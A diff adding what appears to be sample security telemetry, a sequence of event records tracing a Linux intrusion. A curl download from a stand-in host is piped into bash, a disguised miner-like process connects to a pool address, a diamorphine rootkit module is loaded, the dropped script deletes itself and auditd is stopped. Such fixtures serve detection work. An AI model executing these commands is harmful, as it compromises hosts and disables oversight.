@@ -1,0 +1,147 @@
+{
+  time: 2026-09-14T08:12:01.120Z,
+  class_name: "Process Activity",
+  activity_name: "Launch",
+  process: "sh",
+  cmd: "sh -c curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh && bash /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:01.410Z,
+  class_name: "Process Activity",
+  activity_name: "Launch",
+  process: "curl",
+  cmd: "curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:01.430Z,
+  class_name: "DNS Activity",
+  activity_name: "Response",
+  process: "curl",
+  cmd: "curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:01.450Z,
+  class_name: "Network Activity",
+  activity_name: "Open",
+  process: "curl",
+  cmd: "curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:02.020Z,
+  class_name: "File System Activity",
+  activity_name: "Create",
+  process: "curl",
+  cmd: "curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:02.090Z,
+  class_name: "File System Activity",
+  activity_name: "Update",
+  process: "curl",
+  cmd: "curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:02.095Z,
+  class_name: "Process Activity",
+  activity_name: "Terminate",
+  process: "curl",
+  cmd: "curl -fsSL http://dl.evil-cdn.example/x.sh -o /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:03.300Z,
+  class_name: "Process Activity",
+  activity_name: "Launch",
+  process: "x.sh",
+  cmd: "/bin/bash /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:03.500Z,
+  class_name: "File System Activity",
+  activity_name: "Create",
+  process: "x.sh",
+  cmd: "/bin/bash /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:04.100Z,
+  class_name: "Process Activity",
+  activity_name: "Launch",
+  process: "kworker-ng",
+  cmd: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+}
+{
+  time: 2026-09-14T08:12:04.150Z,
+  class_name: "Module Activity",
+  activity_name: "Load",
+  process: "kworker-ng",
+  cmd: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+}
+{
+  time: 2026-09-14T08:12:04.200Z,
+  class_name: "Memory Activity",
+  activity_name: "Modify Page",
+  process: "kworker-ng",
+  cmd: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+}
+{
+  time: 2026-09-14T08:12:04.300Z,
+  class_name: "Network Activity",
+  activity_name: "Open",
+  process: "kworker-ng",
+  cmd: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+}
+{
+  time: 2026-09-14T08:12:05.100Z,
+  class_name: "Process Activity",
+  activity_name: "Launch",
+  process: "insmod",
+  cmd: "insmod /tmp/.diamorphine.ko",
+}
+{
+  time: 2026-09-14T08:12:05.200Z,
+  class_name: "Kernel Extension Activity",
+  activity_name: "Load",
+  process: "insmod",
+  cmd: "insmod /tmp/.diamorphine.ko",
+}
+{
+  time: 2026-09-14T08:12:06.100Z,
+  class_name: "Process Activity",
+  activity_name: "Open",
+  process: "sshd",
+  cmd: "/usr/sbin/sshd -D",
+}
+{
+  time: 2026-09-14T08:12:07.100Z,
+  class_name: "File System Activity",
+  activity_name: "Rename",
+  process: "x.sh",
+  cmd: "/bin/bash /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:08.100Z,
+  class_name: "File System Activity",
+  activity_name: "Delete",
+  process: "x.sh",
+  cmd: "/bin/bash /tmp/.x.sh",
+}
+{
+  time: 2026-09-14T08:12:09.100Z,
+  class_name: "Process Activity",
+  activity_name: "Terminate",
+  process: "auditd",
+  cmd: "/usr/sbin/auditd",
+}
+{
+  time: 2026-09-14T08:12:09.500Z,
+  class_name: "Process Activity",
+  activity_name: "Launch",
+  process: "kworker-ng",
+  cmd: "/tmp/.kworker-ng --pool 198.51.100.7:4444",
+}
+{
+  time: 2026-09-14T08:12:10.100Z,
+  class_name: "Process Activity",
+  activity_name: "Terminate",
+  process: "x.sh",
+  cmd: "/bin/bash /tmp/.x.sh",
+}
